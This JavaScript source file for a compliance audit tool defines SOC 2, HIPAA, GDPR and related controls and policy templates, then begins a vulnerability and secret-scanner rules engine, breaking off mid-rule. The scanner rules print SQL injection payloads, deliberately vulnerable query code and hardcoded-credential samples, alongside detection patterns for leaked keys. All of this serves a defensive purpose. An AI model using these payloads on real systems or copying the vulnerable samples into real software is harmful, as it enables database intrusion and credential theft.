/**
 * ComplianceShield - Multi-Framework Audit Readiness Engine
 * Supports: SOC 2 Type II, ISO 27001:2022, HIPAA Security/Privacy, GDPR, PCI-DSS v4, NIST CSF 2.0
 */

// --- 1. Framework Definitions ---
const FRAMEWORKS = [
  { id: 'soc2', name: 'SOC 2 Type II', icon: '🛡️', desc: 'Trust Services Criteria (Security, Availability, Confidentiality)', weight: 1.0 },
  { id: 'iso27001', name: 'ISO/IEC 27001', icon: '🌐', desc: 'Global Information Security Management Standard (ISMS 2022)', weight: 1.0 },
  { id: 'hipaa', name: 'HIPAA Security', icon: '🩺', desc: 'Protected Health Info (PHI) Safeguards (Admin, Tech, Physical)', weight: 1.0 },
  { id: 'gdpr', name: 'GDPR / Privacy', icon: '🇪🇺', desc: 'EU General Data Protection Regulation & Data Subject Rights', weight: 1.0 },
  { id: 'pci', name: 'PCI-DSS v4.0', icon: '💳', desc: 'Payment Card Industry Data Security Standard for Cardholder Data', weight: 0.9 },
  { id: 'nist', name: 'NIST CSF 2.0', icon: '🏛️', desc: 'Cybersecurity Framework (Govern, Protect, Detect, Respond, Recover)', weight: 0.9 }
];

// --- 2. Master Controls Database ---
const CONTROLS = [
  // --- Access & IAM ---
  {
    id: 'IAM-01',
    category: 'Access & IAM',
    title: 'Multi-Factor Authentication (MFA) Enforced',
    desc: 'MFA (TOTP, WebAuthn, or Hardware Keys) is strictly enforced for all administrative consoles, production servers, code repositories, and employee accounts.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC6.1 | ISO 27001 A.8.5 | HIPAA §164.312(d) | PCI-DSS Req 8.4',
    auditorProof: 'Screenshot of SSO/IdP enforcing MFA across 100% of staff, IAM policy JSON enforcing MFA, GitHub/GitLab org settings.',
    remediationTip: 'Enforce SSO via Okta/Google Workspace with WebAuthn/TOTP. Disable raw username/password API access.'
  },
  {
    id: 'IAM-02',
    category: 'Access & IAM',
    title: 'Role-Based Access Control (RBAC) & Least Privilege',
    desc: 'Access permissions follow the principle of least privilege. Production database and infrastructure write privileges are strictly limited to authorized engineers with approval trails.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci', 'nist'],
    citations: 'SOC 2 CC6.2, CC6.3 | ISO 27001 A.5.15 | HIPAA §164.312(a)(1) | GDPR Art 32',
    auditorProof: 'AWS/GCP IAM roles showing separation of dev and prod, database user grants, quarterly access review logs.',
    remediationTip: 'Use separate AWS accounts or GCP projects for Dev and Prod. Enforce Just-In-Time (JIT) temporary elevated access.'
  },
  {
    id: 'IAM-03',
    category: 'Access & IAM',
    title: 'Quarterly User Access Reviews & Instant Deprovisioning',
    desc: 'Formal quarterly access reviews are executed and recorded. Automated deprovisioning revokes all access within 24 hours of employee departure.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci'],
    citations: 'SOC 2 CC6.2 | ISO 27001 A.5.18 | HIPAA §164.308(a)(3) | PCI Req 8.2',
    auditorProof: 'HR termination ticket matched with Okta/Slack/GitHub logoff timestamp within 24h, signed quarterly access review spreadsheets.',
    remediationTip: 'Automate offboarding scripts or SCIM directory sync with HRIS (Rippling, Gusto, BambooHR).'
  },

  // --- Data & Encryption ---
  {
    id: 'DATA-01',
    category: 'Data & Encryption',
    title: 'Encryption in Transit (TLS 1.2+ / HSTS)',
    desc: 'All HTTP traffic is automatically redirected to HTTPS using TLS 1.2 or TLS 1.3 with strong cipher suites and HSTS (HTTP Strict Transport Security) enabled.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci', 'nist'],
    citations: 'SOC 2 CC6.6 | ISO 27001 A.8.24 | HIPAA §164.312(e)(1) | GDPR Art 32(1)(a) | PCI Req 4.1',
    auditorProof: 'SSL Labs A+ test result, ALB/Cloudflare TLS configuration showing TLS 1.0/1.1 disabled.',
    remediationTip: 'Set `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` and enforce TLS 1.3 in reverse proxy/CDN.'
  },
  {
    id: 'DATA-02',
    category: 'Data & Encryption',
    title: 'Encryption at Rest (AES-256) for Databases & Storage',
    desc: 'All production datastores (PostgreSQL, MySQL, MongoDB, S3 buckets, EBS disks) are encrypted at rest using AES-256 with managed KMS keys and automated key rotation.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci', 'nist'],
    citations: 'SOC 2 CC6.1, CC6.7 | ISO 27001 A.8.24 | HIPAA §164.312(a)(2)(iv) | PCI Req 3.5',
    auditorProof: 'RDS / S3 bucket settings showing SSE-KMS enabled, AWS KMS customer-managed key auto-rotation enabled.',
    remediationTip: 'Enable AWS KMS default encryption for all S3 buckets and RDS storage. Block unencrypted volume attachment in terraform.'
  },
  {
    id: 'DATA-03',
    category: 'Data & Encryption',
    title: 'Data Classification & PII/PHI Field Masking',
    desc: 'Sensitive data (SSN, credit card numbers, PHI, passwords) is never logged in plaintext and is masked or tokenized in application logs, APM, and analytics tools.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'pci'],
    citations: 'SOC 2 CC6.1 | HIPAA §164.312(b) | GDPR Art 32 | PCI Req 3.3, 3.4',
    auditorProof: 'Sample log query from Datadog/CloudWatch showing sanitized request bodies, regex scrubbing filters in Winston/Log4j/Serilog.',
    remediationTip: 'Configure log sanitizers to scrub keys matching `/(password|token|card|ssn|health|dob)/i`.'
  },

  // --- Audit, Logging & Detection ---
  {
    id: 'LOG-01',
    category: 'Audit & Logging',
    title: 'Centralized, Tamper-Evident Audit Logging',
    desc: 'Security events (logins, privilege escalations, data exports, password resets) are forwarded to an immutable centralized log repository with retention of at least 365 days.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC7.2 | ISO 27001 A.8.15 | HIPAA §164.312(b) | PCI Req 10.2, 10.5',
    auditorProof: 'CloudTrail log stream with S3 Object Lock / MFA delete, Datadog/Splunk retention policy showing 1-year archive.',
    remediationTip: 'Forward AWS CloudTrail to an isolated security AWS account with S3 Object Lock in Compliance mode.'
  },
  {
    id: 'LOG-02',
    category: 'Audit & Logging',
    title: 'Real-Time Alerting on Anomalous Access & Threat Detection',
    desc: 'Automated monitoring triggers real-time alerts (via PagerDuty, Slack, or email) upon detecting brute force attempts, unauthorized root account usage, or mass data exfiltration.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC7.3 | ISO 27001 A.8.16 | HIPAA §164.308(a)(1)(ii)(D) | PCI Req 10.6',
    auditorProof: 'AWS GuardDuty enabled, alert notification channel test, runbook for security incident escalation.',
    remediationTip: 'Enable AWS GuardDuty and Security Hub; route findings severity >= HIGH to PagerDuty on-call.'
  },

  // --- Infrastructure & DevSecOps ---
  {
    id: 'OPS-01',
    category: 'Infrastructure & DevSecOps',
    title: 'CI/CD Automated Vulnerability & Dependency Scanning',
    desc: 'Automated SAST (Static Application Security Testing) and SCA (Software Composition Analysis) run on every pull request to block critical CVEs and secrets from merging to main.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'pci', 'nist'],
    citations: 'SOC 2 CC7.1, CC8.1 | ISO 27001 A.8.28 | PCI Req 6.2, 6.3',
    auditorProof: 'GitHub Actions / GitLab CI pipeline showing Snyk/Dependabot/Trivy blocking builds with Critical CVEs.',
    remediationTip: 'Add GitHub Dependabot, Snyk, and GitGuardian secret detection to your pull-request validation workflow.'
  },
  {
    id: 'OPS-02',
    category: 'Infrastructure & DevSecOps',
    title: 'Formal Change Management & Peer Code Review',
    desc: 'Direct commits to production branches (`main`/`master`) are protected. Every code change requires at least one peer approval and passing integration tests.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci'],
    citations: 'SOC 2 CC8.1 | ISO 27001 A.8.32 | HIPAA §164.312(c)(1) | PCI Req 6.4, 6.5',
    auditorProof: 'Branch protection rule configuration screenshot on `main` branch with `Require pull request reviews before merging` checked.',
    remediationTip: 'Enforce branch protection rules with mandatory PR review approvals and signed commits.'
  },
  {
    id: 'OPS-03',
    category: 'Infrastructure & DevSecOps',
    title: 'Automated Daily Backups & Tested Disaster Recovery (DR)',
    desc: 'Database and stateful storage are backed up daily with point-in-time recovery (PITR). Disaster recovery restoration is tested and documented at least once annually.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'nist'],
    citations: 'SOC 2 A1.2, A1.3 | ISO 27001 A.8.13, A.8.14 | HIPAA §164.308(a)(7) | GDPR Art 32(1)(c)',
    auditorProof: 'AWS RDS Automated Backup retention >= 30 days, annual DR drill test report signed by CTO with RTO/RPO targets.',
    remediationTip: 'Enable AWS Backup cross-region copy and schedule an automated dry-run restore test quarterly.'
  },

  // --- Privacy & Data Subject Rights (GDPR / HIPAA Focus) ---
  {
    id: 'PRIV-01',
    category: 'Privacy & Data Rights',
    title: 'Data Subject Right to Erasure / Deletion Endpoint ("Right to Be Forgotten")',
    desc: 'Users can submit account deletion requests. Application code and database workflows reliably purge or anonymize personal data across all datastores within 30 days.',
    severity: 'high',
    frameworks: ['gdpr', 'soc2'],
    citations: 'GDPR Article 17 (Right to Erasure) | SOC 2 Privacy Criteria P4.2',
    auditorProof: 'Documented API route `/api/user/delete-account` or admin deletion workflow, database cascading hard-delete or anonymization scripts.',
    remediationTip: 'Implement an automated queue job that anonymizes PII and triggers soft/hard deletion across primary DB, CRM, and analytics.'
  },
  {
    id: 'PRIV-02',
    category: 'Privacy & Data Rights',
    title: 'Cookie Consent Banner with Prior Consent & Opt-Out',
    desc: 'Non-essential tracking scripts (Google Analytics, Meta Pixel, FullStory) are blocked until the user provides active opt-in consent. Reject All is as easy as Accept All.',
    severity: 'high',
    frameworks: ['gdpr'],
    citations: 'GDPR Article 6, 7 & ePrivacy Directive',
    auditorProof: 'Cookie consent platform configuration (OneTrust, Cookiebot, Klaro) showing zero analytics cookies fired before acceptance.',
    remediationTip: 'Use a compliant CMP like Cookiebot or Klaro. Ensure analytics tags only fire on `consent_status === "granted"`.'
  },
  {
    id: 'PRIV-03',
    category: 'Privacy & Data Rights',
    title: 'Data Subject Export / Portability Endpoint',
    desc: 'Users can download all their personal profile information and activity history in a structured, commonly used machine-readable format (JSON or CSV).',
    severity: 'medium',
    frameworks: ['gdpr'],
    citations: 'GDPR Article 20 (Right to Data Portability)',
    auditorProof: 'User dashboard "Download My Data" button yielding a complete archive zip/json file.',
    remediationTip: 'Create an asynchronous worker that packages user profile, orders, and logs into a password-protected zip file.'
  },
  {
    id: 'PRIV-04',
    category: 'Privacy & Data Rights',
    title: 'HIPAA Business Associate Agreements (BAAs) with All Cloud Vendors',
    desc: 'Signed BAAs are in place with all third-party sub-processors handling Protected Health Information (AWS, Google Cloud, Twilio, SendGrid, Datadog).',
    severity: 'high',
    frameworks: ['hipaa'],
    citations: 'HIPAA §164.502(e) & §164.504(e)',
    auditorProof: 'Executed BAA PDF agreements from AWS, Twilio, and other sub-processors stored in vendor compliance folder.',
    remediationTip: 'Accept the AWS BAA via AWS Artifact console. Audit all third-party APIs for PHI data flows.'
  },
  {
    id: 'PRIV-05',
    category: 'Privacy & Data Rights',
    title: '72-Hour Breach Notification Protocol',
    desc: 'A defined breach response procedure ensures regulators (Data Protection Authorities / HHS OCR) and affected users are notified within 72 hours of incident confirmation.',
    severity: 'high',
    frameworks: ['gdpr', 'hipaa', 'soc2'],
    citations: 'GDPR Article 33, 34 | HIPAA Breach Notification Rule §164.400 | SOC 2 CC7.3',
    auditorProof: 'Written Incident Response Plan with 72-hour regulatory notification template and assigned Incident Commander role.',
    remediationTip: 'Maintain a pre-drafted incident disclosure template and contact list for EU DPAs and legal counsel.'
  },

  // --- Governance & Vendor Risk ---
  {
    id: 'GOV-01',
    category: 'Governance & Vendor Risk',
    title: 'Annual Third-Party Penetration Testing',
    desc: 'An independent certified security penetration testing firm tests the web application and API infrastructure at least once per 12 months with findings remediated.',
    severity: 'high',
    frameworks: ['soc2', 'iso27001', 'pci', 'nist'],
    citations: 'SOC 2 CC7.1 | ISO 27001 A.8.8 | PCI Req 11.3 | NIST CSF DE.CM',
    auditorProof: 'Executive Summary Attestation letter from an accredited pentest firm dated within past 365 days.',
    remediationTip: 'Schedule an annual grey-box web application pen test with firms like Cobalt, HackerOne, or Bishop Fox.'
  },
  {
    id: 'GOV-02',
    category: 'Governance & Vendor Risk',
    title: 'Vendor Risk Assessment & Sub-Processor Management',
    desc: 'All third-party software, cloud services, and contractors are vetted for security certifications (SOC 2, ISO 27001) prior to onboarding and reviewed annually.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'gdpr', 'nist'],
    citations: 'SOC 2 CC9.2 | ISO 27001 A.5.19, A.5.21 | GDPR Art 28 (DPA)',
    auditorProof: 'Vendor inventory sheet with current SOC 2 Type II reports and signed Data Processing Addendums (DPAs) on file.',
    remediationTip: 'Maintain a public Sub-processor page and require all B2B vendors to supply their current SOC 2 report.'
  },
  {
    id: 'GOV-03',
    category: 'Governance & Vendor Risk',
    title: 'Annual Security Awareness Training for All Employees',
    desc: 'All personnel with access to corporate networks or code repositories complete interactive security awareness and phishing prevention training annually.',
    severity: 'medium',
    frameworks: ['soc2', 'iso27001', 'hipaa', 'pci', 'nist'],
    citations: 'SOC 2 CC2.2 | ISO 27001 A.6.3 | HIPAA §164.308(a)(5) | PCI Req 12.6',
    auditorProof: 'Training completion logs from platforms like KnowBe4, Curricula, or Drata showing 100% staff completion.',
    remediationTip: 'Set up automated onboarding training via Drata, Vanta, or KnowBe4 with mandatory completion within 30 days of hire.'
  },
  {
    id: 'PRIV-06',
    category: 'Privacy & Data Rights',
    title: 'COPPA & Minor Age Gating with Verifiable Parental Consent',
    desc: 'Registration and profile creation flows incorporate neutral age gating. Users under 13 (US COPPA) or 16 (EU GDPR Art 8) or 18 (India DPDP Act 2023 Sec 9) require verifiable parental consent before personal data collection.',
    severity: 'high',
    frameworks: ['gdpr', 'soc2'],
    citations: 'COPPA 15 U.S.C. §§ 6501-6506 | FTC 16 CFR Part 312 | GDPR Art 8 | India DPDP Act 2023 Sec 9 | UK Age Appropriate Design Code',
    auditorProof: 'Registration flow UI screenshot showing neutral DOB picker, backend age validation logic blocking minors or routing to parental consent API, parental consent audit records.',
    remediationTip: 'Prompt for Date of Birth on signup. For minors, block account creation or integrate Verifiable Parental Consent (VPC) via credit card authorization or signed consent form.'
  },
  {
    id: 'PRIV-07',
    category: 'Privacy & Data Rights',
    title: 'Local Asset Self-Hosting & Google Fonts Privacy (Zero Dynamic IP Leaks)',
    desc: 'All typography font files and static design assets are bundled locally in the application binary or hosted on own CDN. Dynamic runtime fetches to Google Fonts or third-party CDNs without prior user consent are completely eliminated.',
    severity: 'high',
    frameworks: ['gdpr'],
    citations: 'GDPR Art 6(1)(f) | Munich Regional Court Case 3 O 17493/20 | ePrivacy Directive 2002/58/EC',
    auditorProof: 'Flutter main.dart showing `GoogleFonts.config.allowRuntimeFetching = false;`, pubspec.yaml assets showing bundled font TTF/OTF files, browser network tab showing zero requests to fonts.googleapis.com before consent.',
    remediationTip: 'In Flutter, bundle fonts in `assets/fonts/` and set `GoogleFonts.config.allowRuntimeFetching = false;`. In Web apps, download .woff2 files and serve via local CSS `@font-face`.'
  },
  {
    id: 'PRIV-08',
    category: 'Privacy & Data Rights',
    title: 'Session Replay Transparency, DOM Masking & Affirmative Opt-In',
    desc: 'Session recording tools (FullStory, LogRocket, Clarity, Hotjar, Smartlook) are delayed until active opt-in consent is recorded. Sensitive form fields, passwords, and PII are masked at the DOM level.',
    severity: 'high',
    frameworks: ['gdpr', 'soc2'],
    citations: 'GDPR Art 6, 7 | California CCPA/CPRA § 1798.100 | Pennsylvania Wiretap Act 18 Pa.C.S. § 5701 | Florida Stat. § 934.03 | Cal. Penal Code § 631 (CIPA)',
    auditorProof: 'Cookie consent platform configuration showing session replay tags blocked by default, SDK initialization code showing `maskAllInputs: true` and consent-conditional wrapper.',
    remediationTip: 'Gate session replay initialization behind `if (userConsent.analytics === true)`. Configure SDK DOM masking (`maskAllInputs: true`, `fs-mask`, `data-clarity-mask="true"`).'
  },
  {
    id: 'COMM-01',
    category: 'Privacy & Data Rights',
    title: 'Commercial Email Compliance: One-Click Unsubscribe & Physical Address',
    desc: 'All outbound commercial emails, marketing digests, and automated notifications include an immediate one-click unsubscribe mechanism (RFC 2369 / RFC 8058 List-Unsubscribe header) and the sender registered physical postal address.',
    severity: 'high',
    frameworks: ['gdpr', 'soc2'],
    citations: 'US CAN-SPAM Act 15 U.S.C. § 7704 | Canada CASL Sec 6 | EU ePrivacy Directive Art 13 | UK PECR Reg 22 | Australia Spam Act 2003',
    auditorProof: 'Sample transactional and newsletter email templates showing working `{{unsubscribe_url}}` link, `List-Unsubscribe` email header, and registered corporate physical postal street address in footer.',
    remediationTip: 'Configure mailer templates (SendGrid, Resend, Nodemailer) with universal footer containing `{{unsubscribe_url}}`, postal address, and add `List-Unsubscribe: <https://...>` header.'
  }
];

// --- 3. Pre-Engineered App Profiles / Presets ---
const PRESETS = {
  custom: {},
  saas: {
    'IAM-01': 'compliant', 'IAM-02': 'compliant', 'IAM-03': 'compliant',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'gap',
    'LOG-01': 'compliant', 'LOG-02': 'gap',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'compliant', 'PRIV-02': 'gap', 'PRIV-03': 'gap', 'PRIV-04': 'gap', 'PRIV-05': 'compliant',
    'PRIV-06': 'gap', 'PRIV-07': 'gap', 'PRIV-08': 'gap', 'COMM-01': 'compliant',
    'GOV-01': 'compliant', 'GOV-02': 'compliant', 'GOV-03': 'compliant'
  },
  health: {
    'IAM-01': 'compliant', 'IAM-02': 'compliant', 'IAM-03': 'compliant',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'compliant',
    'LOG-01': 'compliant', 'LOG-02': 'compliant',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'gap', 'PRIV-02': 'gap', 'PRIV-03': 'gap', 'PRIV-04': 'compliant', 'PRIV-05': 'compliant',
    'PRIV-06': 'compliant', 'PRIV-07': 'compliant', 'PRIV-08': 'compliant', 'COMM-01': 'compliant',
    'GOV-01': 'compliant', 'GOV-02': 'compliant', 'GOV-03': 'compliant'
  },
  fintech: {
    'IAM-01': 'compliant', 'IAM-02': 'compliant', 'IAM-03': 'compliant',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'compliant',
    'LOG-01': 'compliant', 'LOG-02': 'compliant',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'compliant', 'PRIV-02': 'gap', 'PRIV-03': 'gap', 'PRIV-04': 'gap', 'PRIV-05': 'compliant',
    'PRIV-06': 'compliant', 'PRIV-07': 'gap', 'PRIV-08': 'gap', 'COMM-01': 'compliant',
    'GOV-01': 'compliant', 'GOV-02': 'compliant', 'GOV-03': 'compliant'
  },
  consumer: {
    'IAM-01': 'compliant', 'IAM-02': 'gap', 'IAM-03': 'gap',
    'DATA-01': 'compliant', 'DATA-02': 'compliant', 'DATA-03': 'gap',
    'LOG-01': 'gap', 'LOG-02': 'gap',
    'OPS-01': 'compliant', 'OPS-02': 'compliant', 'OPS-03': 'compliant',
    'PRIV-01': 'compliant', 'PRIV-02': 'compliant', 'PRIV-03': 'compliant', 'PRIV-04': 'gap', 'PRIV-05': 'compliant',
    'PRIV-06': 'gap', 'PRIV-07': 'gap', 'PRIV-08': 'gap', 'COMM-01': 'gap',
    'GOV-01': 'gap', 'GOV-02': 'gap', 'GOV-03': 'gap'
  }
};

// --- 4. Policy Templates ---
const POLICY_TEMPLATES = {
  ir: `# INFORMATION SECURITY INCIDENT RESPONSE PLAN (SOC 2 CC7.3 & GDPR ART 33)

## 1. Purpose & Scope
This Incident Response Plan outlines the protocols for identifying, containing, eradicating, and reporting security incidents and personal data breaches for {{APP_NAME}} in compliance with SOC 2 CC7.3, ISO 27001 A.5.24, HIPAA, and GDPR.

## 2. Incident Response Team (IRT)
- **Incident Commander (IC):** Chief Technology Officer / Head of Security
- **Technical Lead:** Lead DevOps / Infrastructure Engineer
- **Legal & Communications Officer:** General Counsel / Data Protection Officer (DPO)

## 3. Incident Classification
- **P1 - Critical (Data Breach / Severe Outage):** Active exfiltration of PII/PHI or total platform disruption.
- **P2 - High (Elevated Privilege / Ransomware attempt):** Compromised administrator credential or ransomware on internal device.
- **P3 - Medium (Suspicious Activity):** Blocked brute force attempt, non-critical vulnerability discovered.

## 4. 72-Hour Regulatory Breach Notification (GDPR & HIPAA)
In accordance with GDPR Article 33 and HIPAA Breach Notification Rule:
1. Upon confirming a breach affecting personal data, the DPO must notify the relevant Data Protection Authority (DPA) within **72 hours**.
2. If the breach poses a high risk to individuals' rights and freedoms, affected users must be notified without undue delay.

## 5. Post-Incident Review
Within 5 business days of incident resolution, the IRT will conduct a Root Cause Analysis (RCA) meeting and document corrective actions.`,

  access: `# ACCESS CONTROL, IDENTITY & MFA POLICY (SOC 2 CC6.1 & ISO 27001 A.8.5)

## 1. Policy Statement
All access to {{APP_NAME}} systems, source code repositories, cloud hosting infrastructure, and customer data stores must adhere strictly to the principle of Least Privilege and Multi-Factor Authentication.

## 2. Multi-Factor Authentication (MFA)
- MFA is mandatory for all corporate email, Single Sign-On (SSO), AWS/GCP management consoles, GitHub, and remote VPNs.
- Acceptable second factors: FIDO2/WebAuthn Hardware keys (Yubikey) or Authenticator App TOTP. SMS-based 2FA is prohibited for administrative access.

## 3. Production Environment Separation
- No human engineer shall possess standing read/write credentials to production databases containing customer data.
- Elevated emergency access ("Break-glass") requires approval from two team leads and expires automatically after 4 hours.

## 4. Deprovisioning & Offboarding
Upon notification of an employee or contractor termination, all user access across all systems must be revoked within twenty-four (24) hours.`,

  retention: `# DATA RETENTION & RIGHT-TO-BE-FORGOTTEN POLICY (GDPR ART 17)

## 1. Objective
Establish standard retention periods and safe erasure mechanisms for customer information stored across {{APP_NAME}} in compliance with GDPR Article 17 and SOC 2 Privacy Criteria.

## 2. Standard Retention Schedules
- **Active Account Data:** Retained for the duration of the active subscription.
- **Deleted Account PII:** Purged or anonymized across primary datastores within 30 days of deletion request.
- **Financial & Transaction Logs:** Retained for 7 years to satisfy statutory tax obligations.
- **Application Security Logs:** Retained in cold storage for 365 days, then automatically purged.

## 3. Execution of Erasure Requests
1. The user requests deletion via Account Settings or by emailing privacy@{{DOMAIN}}.
2. System triggers an asynchronous queue worker to anonymize PII in transactional tables.
3. Sub-processors (CRM, email delivery services) are notified via automated API webhooks.`,

  bcdr: `# BUSINESS CONTINUITY & DISASTER RECOVERY (BCDR) PLAN (SOC 2 A1.2 & ISO 27001 A.8.14)

## 1. Objectives
- **Recovery Point Objective (RPO):** Maximum acceptable data loss is 1 hour.
- **Recovery Time Objective (RTO):** Maximum acceptable downtime to restore critical services is 4 hours.

## 2. Backup Architecture
- Production databases utilize continuous WAL archiving and automated daily snapshots.
- Backups are encrypted at rest with AES-256 and replicated across multi-region cloud zones.

## 3. Annual DR Simulation
The engineering team executes a live failover and restoration test at least once every 12 calendar months. Results and timestamps are recorded for audit compliance.`,

  vendor: `# THIRD-PARTY VENDOR RISK MANAGEMENT POLICY (SOC 2 CC9.2)

## 1. Scope
Applies to all external SaaS providers, cloud vendors, and consultants that process, transmit, or store {{APP_NAME}} data.

## 2. Vendor Onboarding Requirements
Before executing an agreement, vendors must provide:
1. Current SOC 2 Type II or ISO 27001 certification.
2. Signed Data Processing Addendum (DPA) incorporating Standard Contractual Clauses (SCCs).
3. Evidence of data encryption at rest and in transit.

## 3. Annual Review
All Tier-1 critical vendors undergo an annual security posture re-assessment.`,

  hipaa_baa: `# HIPAA BUSINESS ASSOCIATE AGREEMENT (BAA) ADDENDUM

## 1. Parties
This Agreement applies between {{APP_NAME}} ("Business Associate") and Covered Entities utilizing healthcare services in compliance with 45 CFR Part 160 and Part 164.

## 2. Permitted Uses & Disclosures of PHI
Business Associate agrees not to use or disclose Protected Health Information (PHI) other than as permitted or required by this Agreement or as required by law.

## 3. Appropriate Safeguards
Business Associate agrees to implement administrative, physical, and technical safeguards that reasonably and appropriately protect the confidentiality, integrity, and availability of electronic PHI that it creates, receives, maintains, or transmits.

## 4. Breach Notification
Business Associate shall report to Covered Entity any acquisition, access, use, or disclosure of unsecured PHI in violation of HIPAA within five (5) business days of discovery.`
};

// --- 5. Code Security & Secret Scanner Rules Engine ---
const CODE_VULN_RULES = [
  // --- SQL Injection & Database Attacks ---
  {
    id: 'SEC-SQLI-01',
    category: 'Database Attacks',
    title: 'SQL Injection Flaw (Raw Concatenation into Query)',
    severity: 'critical',
    cwe: 'CWE-89: Improper Neutralization of Special Elements used in an SQL Command',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'DATA-03',
    test: (line) => {
      const sqlKeywords = /(SELECT|INSERT\s+INTO|UPDATE|DELETE\s+FROM|DROP\s+TABLE|ALTER\s+TABLE)/i;
      if (!sqlKeywords.test(line)) return false;
      const concatPattern = /(\+\s*[\w\$\.]+|\$\{[^\}]+\}|\%s|\.format\(|f"|f')/i;
      return concatPattern.test(line);
    },
    exploit: 'Attackers can inject malicious SQL payloads (e.g. `\' OR 1=1 --` or `\'; DROP TABLE accounts; --`) to bypass login authorization, exfiltrate private patient/user databases, or overwrite database tables.',
    badCode: `const sql = "SELECT * FROM users WHERE user = '" + input + "'";`,
    goodCode: `// Use Parameterized Prepared Statements ($1, $2 or ?):
const sql = 'SELECT * FROM users WHERE user = $1';
const result = await db.query(sql, [input]);`
  },
  {
    id: 'SEC-SQLI-02',
    category: 'Database Attacks',
    title: 'Direct Dynamic Query Execution without Parameterization',
    severity: 'critical',
    cwe: 'CWE-89: SQL Injection',
    owasp: 'OWASP Top 10 A03:2021 - Injection',
    complianceControl: 'DATA-03',
    test: (line) => {
      return /(db|pool|client|conn|cursor)\.query\s*\(\s*[`'"][^)]*(\+|\$\{)/i.test(line) ||
             /(cursor|db)\.execute\s*\(\s*f["']/i.test(line);
    },
    exploit: 'Dynamic query assembly in database drivers allows full database exfiltration or administrative privilege escalation via URL parameters or JSON request bodies.',
    badCode: `cursor.execute(f"SELECT * FROM patients WHERE id = '{patient_id}'")`,
    goodCode: `# Use SQL Parameter Placeholders:
cursor.execute("SELECT * FROM patients WHERE id = %s", (patient_id,))`
  },

  // --- Hardcoded Secrets & Leaked Keys ---
  {
    id: 'SEC-SECRET-AWS',
    category: 'Secret Leak',
    title: 'Hardcoded AWS Access Key ID Detected',
    severity: 'critical',
    cwe: 'CWE-798: Use of Hard-coded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'IAM-01',
    test: (line) => /(AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}/.test(line),
    exploit: 'Automated internet crawlers scan public code repos within seconds. Leaked AWS keys grant attackers access to spawn rogue crypto-miners, wipe S3 buckets, or hold infrastructure for ransom.',
    badCode: `const AWS_KEY = "AKIAIOSFODNN7EXAMPLE";`,
    goodCode: `// Load from Environment or AWS IAM Roles:
const AWS_KEY = process.env.AWS_ACCESS_KEY_ID;`
  },
  {
    id: 'SEC-SECRET-OPENAI',
    category: 'Secret Leak',
    title: 'Exposed OpenAI / LLM API Key',
    severity: 'critical',
    cwe: 'CWE-798: Hardcoded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'DATA-02',
    test: (line) => /(sk-[a-zA-Z0-9_\-]{20,})/.test(line),
    exploit: 'Attackers drain API credit quotas, fine-tune models on your billing card, or access sensitive AI prompt telemetry.',
    badCode: `const client = new OpenAI({ apiKey: "sk-proj-xyz..." });`,
    goodCode: `const client = new OpenAI({ apiKey: process.env.OPENAI_API_KEY });`
  },
  {
    id: 'SEC-SECRET-GITHUB',
    category: 'Secret Leak',
    title: 'Exposed GitHub Personal Access Token',
    severity: 'critical',
    cwe: 'CWE-798: Hardcoded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'OPS-01',
    test: (line) => /(ghp_[a-zA-Z0-9]{36}|github_pat_[a-zA-Z0-9_]{40,})/.test(line),
    exploit: 'Allows unauthorized threat actors to push backdoors to source code, inject malware into releases, or tamper with CI/CD deployment pipelines.',
    badCode: `const GH_TOKEN = "ghp_1234567890abcdefghijklmnopqrstuv";`,
    goodCode: `const GH_TOKEN = process.env.GITHUB_TOKEN;`
  },
  {
    id: 'SEC-SECRET-DB',
    category: 'Secret Leak',
    title: 'Hardcoded Database URI with Embedded Password',
    severity: 'critical',
    cwe: 'CWE-798: Hardcoded Credentials',
    owasp: 'OWASP Top 10 A07:2021 - Identification & Authentication Failures',
    complianceControl: 'DATA-02',
    test: (line) => /(postgres|mysql|mongodb|redis|mariadb):\/\/[a-zA-Z0-9_\-\.]+:[^@\s'"]+@[a-zA-Z0-9_\-\.]+/i.test(line),
    exploit: 'Direct exposure of database connection credentials allows external attackers to dump production tables without needing application-level access.',
    badCode: `const DB_URI = "postgres://admin:P@ssw0rd123@prod-db.internal:5432/main";`,
    goodCode: `const DB_URI = process.env.DATABASE_URL; // Store in AWS Secrets Manager or Vault`
  },
  {
    id: 'SEC-SECRET-JWT',
    category: 'Secret Leak',
    title: 'Hardcoded JWT Secret or Private Encryption Key',
    severity: 'high',
    cwe: 'CWE-321: Use of Hard-coded Cryptographic Key',
